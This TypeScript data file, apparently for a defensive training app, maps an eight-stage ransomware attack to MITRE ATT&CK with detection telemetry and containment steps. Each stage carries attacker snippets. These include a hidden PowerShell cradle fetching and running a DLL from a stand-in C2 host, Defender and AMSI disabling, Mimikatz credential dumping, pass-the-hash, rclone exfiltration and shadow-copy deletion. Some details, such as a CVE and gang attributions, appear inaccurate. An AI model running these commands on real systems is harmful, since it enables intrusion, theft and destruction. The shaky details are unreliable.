// MITRE ATT&CK Mapped Ransomware Attack Timeline & Defensive Kill Chain Data

export interface MitreTechnique {
  id: string;
  name: string;
  subtechnique?: string;
  url: string;
  description: string;
}

export interface BlueTeamTelemetry {
  windowsEventIds: string[];
  sysmonEvents: string[];
  sigmaRule: string;
  indicatorOfCompromise: string;
  edrAlertTitle: string;
}

export interface ContainmentAction {
  actionTitle: string;
  description: string;
  effectivenessPercentage: number;
  blastRadius: string;
  successMessage: string;
}

export interface RansomwareStage {
  id: string;
  stageNumber: number;
  timelineOffset: string;
  hoursElapsed: number;
  title: string;
  phaseCategory: 'Infiltration' | 'Propagation' | 'Preparation' | 'Detonation';
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  targetNode: 'perimeter' | 'workstation' | 'domain_controller' | 'backup_server' | 'database_server';
  shortDescription: string;
  deepDescription: string;
  mitreTactic: {
    id: string;
    name: string;
  };
  mitreTechniques: MitreTechnique[];
  attackerProcedures: {
    commandOrTool: string;
    purpose: string;
    sampleSnippet: string;
  }[];
  blueTeamTelemetry: BlueTeamTelemetry;
  containmentAction: ContainmentAction;
  realWorldExample: {
    gang: string;
    incident: string;
    detail: string;
  };
}

export const RANSOMWARE_STAGES: RansomwareStage[] = [
  {
    id: 'stage_1_initial_access',
    stageNumber: 1,
    timelineOffset: 'T + 00:00 (Day 0)',
    hoursElapsed: 0,
    title: 'Initial Access & Perimeter Breach',
    phaseCategory: 'Infiltration',
    severity: 'Medium',
    targetNode: 'perimeter',
    shortDescription: 'Attacker leverages initial access brokers (IAB), compromised VPN credentials, or malicious email spearphishing attachments to gain an initial foothold on the corporate perimeter.',
    deepDescription: 'Modern ransomware cartels rarely breach targets themselves from scratch; they purchase active VPN sessions, Citrix access, or RDP gateways from Initial Access Brokers (IABs) on underground forums for $2,000–$10,000. Alternatively, spearphishing emails carrying weaponized OneNote files or ISO archives containing LNK loaders deliver initial stage loaders (QakBot, IcedID, SocGholish).',
    mitreTactic: {
      id: 'TA0001',
      name: 'Initial Access'
    },
    mitreTechniques: [
      {
        id: 'T1566.001',
        name: 'Phishing',
        subtechnique: 'Spearphishing Attachment',
        url: 'https://attack.mitre.org/techniques/T1566/001/',
        description: 'Delivering malicious payloads disguised as vendor invoices or HR resumes inside password-protected ZIP/ISO files.'
      },
      {
        id: 'T1190',
        name: 'Exploit Public-Facing Application',
        url: 'https://attack.mitre.org/techniques/T1190/',
        description: 'Exploiting zero-day or unpatched remote code execution vulnerabilities in SSL VPNs (Fortinet, Ivanti Connect Secure, Citrix Bleed).'
      },
      {
        id: 'T1078.002',
        name: 'Valid Accounts',
        subtechnique: 'Domain Accounts',
        url: 'https://attack.mitre.org/techniques/T1078/002/',
        description: 'Using credentials exfiltrated via RedLine/Lumma infostealer malware sold on genesis market without MFA enforcement.'
      }
    ],
    attackerProcedures: [
      {
        commandOrTool: 'Infostealer Credential Replay',
        purpose: 'Authenticates into corporate SSL VPN or Azure AD without triggering brute-force alarms.',
        sampleSnippet: 'curl -X POST "https://vpn.victim-corp.com/remote/login" -d "user=finance_admin&pass=Compromised2024!"'
      },
      {
        commandOrTool: 'LNK Loader Execution',
        purpose: 'Spawns concealed PowerShell process from an attached ISO container.',
        sampleSnippet: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri https://c2.evil/stage1.dll -OutFile $env:TEMP\\stage1.dll; rundll32.exe $env:TEMP\\stage1.dll,DllRegisterServer"'
      }
    ],
    blueTeamTelemetry: {
      windowsEventIds: ['4624 (Successful Logon from anomalous ASN/Country)', '4625 (Failed Logon bursts)'],
      sysmonEvents: ['Event 1 (Process Creation: powershell.exe spawned by explorer.exe from ISO mount)'],
      sigmaRule: 'proc_creation_win_powershell_download_cradle.yml',
      indicatorOfCompromise: 'Anomalous VPN logon from residential proxy ASN; unfamiliar user agent header; temporary DLL created in %TEMP%.',
      edrAlertTitle: 'Suspicious PowerShell Download Cradle Spawned From Virtual Disk'
    },
    containmentAction: {
      actionTitle: 'Isolate Host & Revoke VPN Session',
      description: 'Terminates active gateway session, resets active user Kerberos tickets, and applies network micro-segmentation to the infected perimeter node.',
      effectivenessPercentage: 98,
      blastRadius: 'Single user workstation isolated; zero impact on core databases or Active Directory.',
      successMessage: 'Perimeter quarantine enforced. Threat actor evicted before beacon establishment or domain reconnaissance.'
    },
    realWorldExample: {
      gang: 'BlackCat (ALPHV) / Scattered Spider',
      incident: 'MGM Resorts Breach (2023)',
      detail: 'Scattered Spider executed a 10-minute social engineering vishing call to the MGM IT Helpdesk, impersonating an employee to reset MFA, gaining initial access.'
    }
  },
  {
    id: 'stage_2_execution_evasion',
    stageNumber: 2,
    timelineOffset: 'T + 00:45 (Hour 1)',
    hoursElapsed: 0.75,
    title: 'Execution & EDR Defense Evasion',
    phaseCategory: 'Infiltration',
    severity: 'High',
    targetNode: 'workstation',
    shortDescription: 'Payload executes in memory, unhooks AV/EDR sensors, disables Windows Defender real-time protection, and establishes an encrypted C2 beacon.',
    deepDescription: 'Once code executes, the threat actor deploys customized loaders utilizing direct syscalls (SysWhispers3) to bypass userland API hooks installed by EDR products (CrowdStrike, SentinelOne). Attackers disable Antivirus via malicious kernel drivers (Bring Your Own Vulnerable Driver - BYOVD technique) and establish high-reputation HTTPS/DNS command-and-control beaconing using Cobalt Strike, Sliver, or Brute Ratel.',
    mitreTactic: {
      id: 'TA0005',
      name: 'Defense Evasion'
    },
    mitreTechniques: [
      {
        id: 'T1562.001',
        name: 'Impair Defenses',
        subtechnique: 'Disable or Modify Tools',
        url: 'https://attack.mitre.org/techniques/T1562/001/',
        description: 'Disabling Windows Defender, tamper protection, and terminating security telemetry daemons.'
      },
      {
        id: 'T1055.001',
        name: 'Process Injection',
        subtechnique: 'Dynamic-link Library Injection',
        url: 'https://attack.mitre.org/techniques/T1055/001/',
        description: 'Injecting reflective beacon DLLs into legitimate Windows processes such as svchost.exe or spoolsv.exe.'
      },
      {
        id: 'T1059.001',
        name: 'Command & Scripting Interpreter',
        subtechnique: 'PowerShell',
        url: 'https://attack.mitre.org/techniques/T1059/001/',
        description: 'Executing living-off-the-land (LotL) binaries to execute stealthy AMSI bypass memory patches.'
      }
    ],
    attackerProcedures: [
      {
        commandOrTool: 'Defender Tampering PowerShell',
        purpose: 'Silences local security telemetry and excludes entire system drive from scans.',
        sampleSnippet: 'Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath "C:\\"'
      },
      {
        commandOrTool: 'AMSI Memory Patching',
        purpose: 'Patches AmsiScanBuffer in memory to always return S_OK / clean status.',
        sampleSnippet: '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)'
      }
    ],
    blueTeamTelemetry: {
      windowsEventIds: ['5001 (Windows Defender Real-Time Protection Disabled)', '7045 (New Kernel Driver Service Registered)'],
      sysmonEvents: ['Event 8 (CreateRemoteThread detected targeting svchost.exe)', 'Event 10 (ProcessAccess into lsass.exe)'],
      sigmaRule: 'proc_creation_win_powershell_disable_defender.yml',
      indicatorOfCompromise: 'Defender tampering alerts; process injection in svchost with unbacked executable memory memory regions (PAGE_EXECUTE_READWRITE).',
      edrAlertTitle: 'Memory Injection Detected: Cobalt Strike Stager Injected into svchost.exe'
    },
    containmentAction: {
      actionTitle: 'Trigger EDR Remote Kill & Network Quarantine',
      description: 'Terminates parent process trees, revokes the endpoint IP lease, and issues host-level microisolation rule blocking all egress to C2 IPs.',
      effectivenessPercentage: 92,
      blastRadius: 'Isolated single compromised workstation; attacker loses C2 connection before network pivot.',
      successMessage: 'C2 beacon killed in memory. EDR sensor re-enabled and quarantine confirmed.'
    },
    realWorldExample: {
      gang: 'LockBit 3.0 (Black)',
      incident: 'LockBit BYOVD Evasion Tactics (2023)',
      detail: 'LockBit deployed a vulnerable, legitimately signed Process Hacker / DBUtil driver to terminate EDR services from kernel space without triggering signature detection.'
    }
  },
  {
    id: 'stage_3_privilege_escalation',
    stageNumber: 3,
    timelineOffset: 'T + 03:30 (Hour 3)',
    hoursElapsed: 3.5,
    title: 'Credential Access & Domain Escalation',
    phaseCategory: 'Propagation',
    severity: 'High',
    targetNode: 'domain_controller',
    shortDescription: 'Attacker dumps LSASS memory for local plaintext hashes, performs Kerberoasting, and escalates from a standard workstation user to Domain Admin.',
    deepDescription: 'Using Mimikatz, procdump, or Nanodump, attackers harvest NTLM hashes and Kerberos tickets cached in the Local Security Authority Subsystem Service (LSASS). They execute Kerberoasting against Service Principal Names (SPNs) with weak passwords and abuse misconfigured Active Directory Certificate Services (ADCS - ESC1/ESC8) or CVE-2024-49113 (NetExec) to forge a Golden Ticket, obtaining complete Domain Admin control.',
    mitreTactic: {
      id: 'TA0006',
      name: 'Credential Access'
    },
    mitreTechniques: [
      {
        id: 'T1003.001',
        name: 'OS Credential Dumping',
        subtechnique: 'LSASS Memory',
        url: 'https://attack.mitre.org/techniques/T1003/001/',
        description: 'Dumping memory contents of lsass.exe to extract stored NTLM hashes and plaintext Kerberos tickets.'
      },
      {
        id: 'T1558.003',
        name: 'Steal or Forge Kerberos Tickets',
        subtechnique: 'Kerberoasting',
        url: 'https://attack.mitre.org/techniques/T1558/003/',
        description: 'Requesting TGS service tickets for user accounts with SPNs and cracking the RC4/AES hashes offline with hashcat.'
      },
      {
        id: 'T1068',
        name: 'Exploitation for Privilege Escalation',
        url: 'https://attack.mitre.org/techniques/T1068/',
        description: 'Exploiting Windows kernel privileges (ZeroLogon CVE-2020-1472 or PrintNightmare) to elevate to NT AUTHORITY\\SYSTEM.'
      }
    ],
    attackerProcedures: [
      {
        commandOrTool: 'Mimikatz / SafetyKatz LSASS Dump',
        purpose: 'Harvests logged-on admin hashes and Kerberos ticket-granting tickets.',
        sampleSnippet: 'privilege::debug\nsekurlsa::logonpasswords full\nlsadump::sam'
      },
      {
        commandOrTool: 'Rubeus Kerberoasting',
        purpose: 'Queries Active Directory for all service accounts configured with Kerberos SPNs.',
        sampleSnippet: 'Rubeus.exe kerberoast /outfile:spn_hashes.txt /format:hashcat'
      }
    ],
    blueTeamTelemetry: {
      windowsEventIds: ['4672 (Special privileges assigned to new logon)', '4769 (A Kerberos service ticket was requested with RC4-HMAC)'],
      sysmonEvents: ['Event 10 (ProcessAccess: Untrusted process requesting PROCESS_VM_READ against lsass.exe)'],
      sigmaRule: 'win_lsass_dump_procdump.yml',
      indicatorOfCompromise: 'Spike in event 4769 ticket requests for legacy RC4 encryption; LSASS memory access from non-system binary.',
      edrAlertTitle: 'Credential Theft Alert: Unauthorized Access to lsass.exe Memory Space'
    },
    containmentAction: {
      actionTitle: 'Double KRBTGT Password Reset & Force Kerberos Ticket Purge',
      description: 'Executes immediate dual reset of the Active Directory krbtgt account password to invalidate all Golden Tickets and forces logoff on all DA sessions.',
      effectivenessPercentage: 86,
      blastRadius: 'Users must re-authenticate across corporate single sign-on; halts Domain-wide credential dominance.',
      successMessage: 'KRBTGT reset completed. All forged Kerberos tickets invalidated; domain admin compromise revoked.'
    },
    realWorldExample: {
      gang: 'Conti Ransomware',
      incident: 'Conti Playbook Leaks (2022)',
      detail: 'Leaked operator manuals revealed Conti teams prioritized Kerberoasting within 2 hours of foothold to crack MSSQL service accounts with domain admin rights.'
    }
  },
  {
    id: 'stage_4_network_discovery',
    stageNumber: 4,
    timelineOffset: 'T + 08:00 (Hour 8)',
    hoursElapsed: 8,
    title: 'Internal Discovery & AD Enumeration',
    phaseCategory: 'Propagation',
    severity: 'Medium',
    targetNode: 'domain_controller',
    shortDescription: 'Attacker maps the entire corporate network, identifying domain controllers, hypervisors (ESXi), Veeam backup servers, and high-value databases.',
    deepDescription: 'Using BloodHound (SharpHound.exe), AdFind, and NetExec, the attacker enumerates Active Directory relationships, nested security groups, and Trust relationships. High priority is placed on finding backup servers (Veeam, Commvault, Cohesity) and virtualization clusters (VMware vCenter/ESXi), because disabling backups guarantees victim leverage during extortion.',
    mitreTactic: {
      id: 'TA0007',
      name: 'Discovery'
    },
    mitreTechniques: [
      {
        id: 'T1087.002',
        name: 'Account Discovery',
        subtechnique: 'Domain Account',
        url: 'https://attack.mitre.org/techniques/T1087/002/',
        description: 'Enumerating domain administrators, enterprise admins, and service accounts.'
      },
      {
        id: 'T1018',
        name: 'Remote System Discovery',
        url: 'https://attack.mitre.org/techniques/T1018/',
        description: 'Scanning subnets for live hosts, open SMB (445) shares, and hypervisor management interfaces.'
      },
      {
        id: 'T1135',
        name: 'Network Share Discovery',
        url: 'https://attack.mitre.org/techniques/T1135/',
        description: 'Listing writable network shares where sensitive IP, finance spreadsheets, and databases reside.'
      }
    ],
    attackerProcedures: [
      {
        commandOrTool: 'SharpHound BloodHound Ingestor',
        purpose: 'Collects all AD graph objects, permissions, and shortest path to Domain Admin in JSON zip.',
        sampleSnippet: 'SharpHound.exe -c All --outputdirectory C:\\Users\\Public\\ --zipfilename ad_graph.zip'
      },
      {
        commandOrTool: 'AdFind AD Enumeration',
        purpose: 'Dumps all domain trusts and computer operating systems without triggering heavy traffic.',
        sampleSnippet: 'AdFind.exe -f "(objectcategory=computer)" operatingSystem -csv > all_computers.csv'
      }
    ],
    blueTeamTelemetry: {
      windowsEventIds: ['1644 (Active Directory LDAP Search Query with high result count)', '5140 (Network Share Object Accessed)'],
      sysmonEvents: ['Event 3 (High-volume internal port scans on ports 389, 445, 88 from single endpoint)'],
      sigmaRule: 'win_ad_bloodhound_sharphound.yml',
      indicatorOfCompromise: 'Large burst of LDAP search queries looking for AdminCount=1; rapid scanning of SMB port 445 across multiple subnets.',
      edrAlertTitle: 'Reconnaissance Alert: BloodHound Ingestor Activity Detected via LDAP'
    },
    containmentAction: {
      actionTitle: 'Sever Inter-VLAN Routing & Revoke Suspicious LDAP Queries',
      description: 'Isolates the scanning host at switch/firewall layer and disables the compromised user account generating LDAP bulk enumerations.',
      effectivenessPercentage: 88,
      blastRadius: 'Stops lateral scan sweep; isolates reconnaissance node without taking down core enterprise servers.',
      successMessage: 'Reconnaissance node blocked. Internal firewalls dropped all horizontal port 445/389 probes.'
    },
    realWorldExample: {
      gang: 'DarkSide / BlackCat',
      incident: 'Colonial Pipeline (2021)',
      detail: 'Operators systematically cataloged OT and IT network share segments before deploying encryption payloads, ensuring pipeline control systems were pressured.'
    }
  },
  {
    id: 'stage_5_lateral_movement',
    stageNumber: 5,
    timelineOffset: 'T + 14:00 (Hour 14)',
    hoursElapsed: 14,
    title: 'Lateral Movement & Fleet Staging',
    phaseCategory: 'Propagation',
    severity: 'High',
    targetNode: 'workstation',
    shortDescription: 'Attacker uses PsExec, WMI, and RDP to spread Cobalt Strike beacons and stage ransomware executables across hundreds of systems.',
    deepDescription: 'Equipped with Domain Admin or Local Administrator credentials, the cartel leverages native administration protocols: WMI (T1047), SMB Named Pipes / PsExec (T1021.002), and WinRM (T1021.006). They upload the ransomware locker binary to administrative shares (e.g., `C$\\Windows\\Temp\\update.exe`) or leverage Active Directory Group Policy Objects (GPOs) to deploy scheduled tasks across 500+ workstations simultaneously.',
    mitreTactic: {
      id: 'TA0008',
      name: 'Lateral Movement'
    },
    mitreTechniques: [
      {
        id: 'T1021.002',
        name: 'Remote Services',
        subtechnique: 'SMB/Windows Admin Shares',
        url: 'https://attack.mitre.org/techniques/T1021/002/',
        description: 'Accessing administrative shares (C$, ADMIN$) to drop secondary stage ransomware binaries.'
      },
      {
        id: 'T1570',
        name: 'Lateral Tool Transfer',
        url: 'https://attack.mitre.org/techniques/T1570/',
        description: 'Distributing ransomware lockers, batch files, and tools like PsExec or NetExec between internal subnets.'
      },
      {
        id: 'T1550.002',
        name: 'Use Alternate Authentication Material',
        subtechnique: 'Pass the Hash',
        url: 'https://attack.mitre.org/techniques/T1550/002/',
        description: 'Authenticating to remote endpoints using harvested NTLM hashes without ever cracking the plaintext password.'
      }
    ],
    attackerProcedures: [
      {
        commandOrTool: 'PsExec / Impacket wmiexec Lateral Push',
        purpose: 'Executes commands remotely on 100+ target endpoints using compromised admin credentials.',
        sampleSnippet: 'wmiexec.py -hashes :e52cac67419a9a22ecb53368ec210130 administrator@192.168.1.50 "cmd.exe /c copy \\\\192.168.1.10\\share\\payload.exe C:\\Windows\\Temp\\"'
      },
      {
        commandOrTool: 'GPO Mass Task Deployment',
        purpose: 'Configures a domain-wide GPO scheduled task to detonate ransomware at a synchronized time.',
        sampleSnippet: 'New-GPO -Name "SecurityPolicyUpdate_2024" | New-GPPrefRegistryValue -Context Computer ...'
      }
    ],
    blueTeamTelemetry: {
      windowsEventIds: ['7045 (New service installed - PSEXESVC)', '4624 (Type 3 Network Logon from internal peer)', '4688 (Process created via WmiPrvSE.exe)'],
      sysmonEvents: ['Event 1 (Process creation: C:\\Windows\\System32\\PSEXESVC.exe spawning cmd.exe)'],
      sigmaRule: 'win_psexec_service_install.yml',
      indicatorOfCompromise: 'PSEXESVC created simultaneously across multiple hosts; high-volume internal SMB file copy of suspicious .exe/.bat files to admin shares.',
      edrAlertTitle: 'Lateral Movement: Mass Remote Service Creation (PsExec) Detected Across Fleet'
    },
    containmentAction: {
      actionTitle: 'Disable Default Admin Shares & Block Inter-Subnet SMB (Port 445)',
      description: 'Enforces emergency host firewall policy blocking inbound 445/3389 between workstation-to-workstation subnets, freezing lateral propagation in place.',
      effectivenessPercentage: 82,
      blastRadius: 'Halts remote management scripts; preserves database server integrity from incoming lateral connections.',
      successMessage: 'Inter-workstation port 445 dropped. Threat actors trapped in current enclave without lateral reach.'
    },
    realWorldExample: {
      gang: 'Ryuk / Wizard Spider',
      incident: 'Universal Health Services (UHS) Breach (2020)',
      detail: 'Ryuk leveraged TrickBot to distribute ransomware via Group Policy Objects, locking over 250 hospital medical facilities within 4 hours.'
    }
  },
  {
    id: 'stage_6_data_exfiltration',
    stageNumber: 6,
    timelineOffset: 'T + 26:00 (Day 2)',
    hoursElapsed: 26,
    title: 'Data Collection & Double Extortion Exfiltration',
    phaseCategory: 'Preparation',
    severity: 'Critical',
    targetNode: 'database_server',
    shortDescription: 'Attacker compresses gigabytes of confidential IP, emails, customer PII, and financial records, uploading them to Mega, Rclone, or attacker bulletproof servers.',
    deepDescription: 'Modern ransomware is "Double Extortion" (and increasingly Triple Extortion). Before a single file is encrypted, the cartel spends 12–24 hours locating and stealing 500GB–2TB of high-value confidential data. If the victim restores from backups and refuses to pay the ransom, the cartel threatens to publish the stolen data on their Tor .onion leak site or notify regulatory bodies (GDPR, SEC).',
    mitreTactic: {
      id: 'TA0010',
      name: 'Exfiltration'
    },
    mitreTechniques: [
      {
        id: 'T1560.001',
        name: 'Archive Collected Data',
        subtechnique: 'Archive via Utility',
        url: 'https://attack.mitre.org/techniques/T1560/001/',
        description: 'Using 7-Zip, WinRAR, or PowerShell to package file trees into split, password-protected multi-part volumes.'
      },
      {
        id: 'T1048.002',
        name: 'Exfiltration Over Alternative Protocol',
        subtechnique: 'Exfiltration Over Asymmetric Encrypted Protocol',
        url: 'https://attack.mitre.org/techniques/T1048/002/',
        description: 'Transferring data over encrypted HTTPS/SFTP connections directly to cloud storage providers (MEGA.nz, DropBox, Anonfiles).'
      },
      {
        id: 'T1567.002',
        name: 'Exfiltration to Cloud Storage',
        url: 'https://attack.mitre.org/techniques/T1567/002/',
        description: 'Using legitimate multi-cloud sync CLI tools like Rclone or MegaSync to rapidly siphon data without triggering traditional Trojan alarms.'
      }
    ],
    attackerProcedures: [
      {
        commandOrTool: '7-Zip Password-Protected Compression',
        purpose: 'Bypasses DLP inspection by encrypting archives with a random 20-character key.',
        sampleSnippet: '7z.exe a -t7z -p"ExfilKey2024!" -mhe=on C:\\Windows\\Temp\\finance_data.7z "\\\\fileserver\\Finance\\*"'
      },
      {
        commandOrTool: 'Rclone Cloud Upload',
        purpose: 'Uploads hundreds of gigabytes to cloud buckets via multi-threaded HTTPS.',
        sampleSnippet: 'rclone.exe copy C:\\Windows\\Temp\\finance_data.7z remote_mega:stolen_data/victim_inc/ --transfers 16 --checkers 8'
      }
    ],
    blueTeamTelemetry: {
      windowsEventIds: ['5145 (A network share object was checked to see whether granted access allowed reading)'],
      sysmonEvents: ['Event 1 (Execution of rclone.exe or 7z.exe with high disk I/O)', 'Event 3 (Outbound connection to mega.nz or anonfiles with sustained high upload bandwidth)'],
      sigmaRule: 'net_high_volume_outbound_data_transfer.yml',
      indicatorOfCompromise: 'Spike in gigabytes of outbound HTTPS egress traffic during off-hours; creation of large .7z/.rar files in Temp directories; Rclone config files on server.',
      edrAlertTitle: 'Data Exfiltration Alert: Anomalous Outbound Traffic Spike to Cloud Storage (Rclone)'
    },
    containmentAction: {
      actionTitle: 'Sever Egress Gateway & Invalidate Cloud API Tokens',
      description: 'Terminates boundary router outbound egress connections to unrecognized cloud domains and blocks file server external internet access.',
      effectivenessPercentage: 74,
      blastRadius: 'Temporary internet disruption for impacted servers; preserves data confidentiality and halts complete leak staging.',
      successMessage: 'External egress blocked at perimeter firewall. 380 GB of pending archive upload aborted.'
    },
    realWorldExample: {
      gang: 'REvil (Sodinokibi) / ALPHV',
      incident: 'Kaseya & JBS Meats Exfiltration (2021)',
      detail: 'REvil exfiltrated 45GB of corporate secrets from JBS before deploying ransomware, forcing an $11 million ransom payment in Bitcoin to prevent public leak.'
    }
  },
  {
    id: 'stage_7_inhibit_recovery',
    stageNumber: 7,
    timelineOffset: 'T + 47:30 (Day 2 - Weekend 02:30 AM)',
    hoursElapsed: 47.5,
    title: 'Inhibit System Recovery & Backup Sabotage',
    phaseCategory: 'Preparation',
    severity: 'Critical',
    targetNode: 'backup_server',
    shortDescription: 'Attacker deletes Volume Shadow Copies, corrupts Windows catalog backups, wipes ESXi snapshots, and shuts down security and database services.',
    deepDescription: 'To maximize ransom leverage, the attackers systematically eliminate any ability for the victim to restore without paying. They execute scripts that wipe Volume Shadow Copies (`vssadmin delete shadows`), disable the Windows Recovery Environment (`bcedit /set recoveryenabled No`), and connect to Veeam/hypervisor APIs to wipe snapshot repositories. They also forcefully terminate database services (SQL, Exchange) to unlock file handles for encryption.',
    mitreTactic: {
      id: 'TA0040',
      name: 'Impact'
    },
    mitreTechniques: [
      {
        id: 'T1490',
        name: 'Inhibit System Recovery',
        url: 'https://attack.mitre.org/techniques/T1490/',
        description: 'Deleting Volume Shadow Copies, backup catalogs, and hypervisor snapshots to prevent forensic rollback.'
      },
      {
        id: 'T1489',
        name: 'Service Stop',
        url: 'https://attack.mitre.org/techniques/T1489/',
        description: 'Stopping database engines (MSSQLSERVER, Oracle, Exchange, Hyper-V) so databases can be encrypted in place.'
      },
      {
        id: 'T1529',
        name: 'System Shutdown/Reboot',
        url: 'https://attack.mitre.org/techniques/T1529/',
        description: 'Powering off virtual machines via VMware ESXi CLI (vim-cmd vmsvc/power.off) to lock VMDK containers.'
      }
    ],
    attackerProcedures: [
      {
        commandOrTool: 'VSS Shadow Copy Deletion Script',
        purpose: 'Destroys all local shadow copies and recovery points in seconds.',
        sampleSnippet: 'vssadmin.exe delete shadows /all /quiet\nwmic.exe shadowcopy delete\nwbadmin.exe delete catalog -quiet\nbcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no'
      },
      {
        commandOrTool: 'Service Termination Batch Loop',
        purpose: 'Kills processes that hold open database file locks.',
        sampleSnippet: 'net stop "MSSQLSERVER" /y\nnet stop "MSSQL$MICROSOFT##WID" /y\nnet stop "MSExchangeIS" /y\nnet stop "VeeamBackupSvc" /y\ntaskkill /F /IM sqlservr.exe /IM vmware.exe'
      }
    ],
    blueTeamTelemetry: {
      windowsEventIds: ['7036 (Service entered stopped state for critical database services)', '4688 (Process creation of vssadmin.exe and bcdedit.exe)'],
      sysmonEvents: ['Event 1 (Execution of vssadmin delete shadows /all /quiet)'],
      sigmaRule: 'proc_creation_win_shadow_copies_deletion.yml',
      indicatorOfCompromise: 'Immediate execution of vssadmin/bcdedit commands; sudden crash or mass termination of SQL and Veeam services.',
      edrAlertTitle: 'Critical Incident: Volume Shadow Copies Deleted & Database Services Force-Stopped'
    },
    containmentAction: {
      actionTitle: 'Trigger Emergency Cold Air-Gap on Immutable Backup Repositories',
      description: 'Physically or logically severs write access to offline WORM (Write Once Read Many) storage and snapshot targets, preserving restore points.',
      effectivenessPercentage: 90,
      blastRadius: 'Backup storage locked into read-only mode; ensures company can rebuild without paying ransom.',
      successMessage: 'Backup immutable repository protected. Ransomware unable to delete external offline snapshots.'
    },
    realWorldExample: {
      gang: 'Hive / Royal Ransomware',
      incident: 'Targeting VMware ESXi & Veeam (2022-2023)',
      detail: 'Hive deployed specialized Linux ELF lockers that logged into ESXi hypervisors via SSH, terminated all running virtual machines, and wiped .vmdk disks directly.'
    }
  },
  {
    id: 'stage_8_detonation_impact',
    stageNumber: 8,
    timelineOffset: 'T + 48:00 (Day 2 - Weekend 03:00 AM)',
    hoursElapsed: 48,
    title: 'High-Speed Encryption & Extortion Detonation',
    phaseCategory: 'Detonation',
    severity: 'Critical',
    targetNode: 'database_server',
    shortDescription: 'Ransomware payload encrypts files using ChaCha20/AES-256 + RSA-4096, renames files with custom extension, changes wallpaper, and leaves ransom notes.',
    deepDescription: 'The final, catastrophic phase. Attacks are scheduled for Saturday/Sunday at 03:00 AM when IT staff are asleep. Using multi-threaded asynchronous I/O (often Intermittent Encryption to maximize speed and bypass heuristics), the malware encrypts databases, VMDKs, documents, and backups in under 30 minutes. It drops `README_RECOVERY.txt` ransom notes, alters the desktop wallpaper, and provides a Tor negotiation portal link demanding multi-million dollar cryptocurrency payment.',
    mitreTactic: {
      id: 'TA0040',
      name: 'Impact'
    },
    mitreTechniques: [
      {
        id: 'T1486',
        name: 'Data Encrypted for Impact',
        url: 'https://attack.mitre.org/techniques/T1486/',
        description: 'Encrypting data on target systems to interrupt availability to system and network resources.'
      },
      {
        id: 'T1491.001',
        name: 'Defacement',
        subtechnique: 'Internal Defacement',
        url: 'https://attack.mitre.org/techniques/T1491/001/',
        description: 'Overwriting user desktop background wallpaper with instructions and victim ID for extortion.'
      },
      {
        id: 'T1659',
        name: 'Content Injection',
        url: 'https://attack.mitre.org/techniques/T1659/',
        description: 'Writing ransom notes in every directory detailing extortion demands and darknet Tor links.'
      }
    ],
    attackerProcedures: [
      {
        commandOrTool: 'Multi-Threaded Intermittent Encryption Engine',
        purpose: 'Encrypts every N-th byte using AES-256-CBC with RSA-4096 master public key to encrypt a 1TB drive in minutes.',
        sampleSnippet: 'locker.exe --path "C:\\" --threads 32 --mode intermittent_50pct --rename-ext .locked'
      },
      {
        commandOrTool: 'Ransom Note Drop & Wallpaper Deface',
        purpose: 'Changes desktop image and prints physical copies on networked printers.',
        sampleSnippet: 'reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "C:\\Windows\\Temp\\ransom_warning.bmp" /f\nRUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters'
      }
    ],
    blueTeamTelemetry: {
      windowsEventIds: ['4663 (Mass file write and delete attempts in rapid succession)'],
      sysmonEvents: ['Event 11 (Mass FileCreate: thousands of files ending in .locked extension created in seconds)', 'Event 13 (Registry value set for Wallpaper)'],
      sigmaRule: 'file_event_win_ransomware_mass_file_modification.yml',
      indicatorOfCompromise: 'Files renamed to .locked or random 8-char extension; HOW_TO_DECRYPT.txt created across all directories; system unresponsive due to 100% disk I/O.',
      edrAlertTitle: 'CRITICAL SEV-1: Mass High-Speed File Renaming & Ransomware Note Detonation'
    },
    containmentAction: {
      actionTitle: 'Emergency Air-Gap Power Disconnect & Forensic RAM Preservation',
      description: 'Instantly pull network uplinks across switches, isolate core hypervisors, and dump RAM on partially encrypted systems to attempt volatile key recovery.',
      effectivenessPercentage: 45,
      blastRadius: 'Total enterprise downtime; systems must be restored from offline immutable backups or bare metal re-imaged.',
      successMessage: 'Emergency network uncoupling executed. Unreached subnets saved from detonation; post-incident recovery plan activated.'
    },
    realWorldExample: {
      gang: 'WannaCry / LockBit / BlackCat',
      incident: 'WannaCry (2017) & Change Healthcare (2024)',
      detail: 'Change Healthcare suffered catastrophic prescription and payment disruptions across the entire US healthcare system following BlackCat encryption of their cloud systems.'
    }
  }
];

// Threat Group Variants Reference
export const THREAT_GROUP_PROFILES = [
  {
    name: 'LockBit 3.0 (Black)',
    origin: 'RaaS (Ransomware-as-a-Service) Syndicate',
    notableTactics: 'Fastest encryption engine; Bug Bounty program; Anti-analysis anti-debugging packers; Custom kernel drivers for EDR unhooking.',
    favoredTooling: 'StealBit, Cobalt Strike, Process Hacker Driver, PsExec',
    encryptionType: 'AES-128 + ECC (Curve25519) + RSA-4096'
  },
  {
    name: 'BlackCat / ALPHV',
    origin: 'Rust-based Cross-Platform Cartel',
    notableTactics: 'Written in Rust for cross-platform Linux/ESXi/Windows targeting; triple extortion (DDoS + Leaks + Calling Executives); search-indexable leak blogs.',
    favoredTooling: 'Rclone, Mimikatz, SharpHound, MegaSync',
    encryptionType: 'ChaCha20 / AES-GCM + RSA'
  },
  {
    name: 'Conti / Wizard Spider',
    origin: 'Highly Organized Russian Syndicate',
    notableTactics: 'Structured like a corporate enterprise with HR, QA, and reverse engineers; specialized in rapid Active Directory dominance and healthcare extortion.',
    favoredTooling: 'TrickBot, BazarLoader, Cobalt Strike, Anchor',
    encryptionType: 'ChaCha20 + RSA-4096'
  }
];
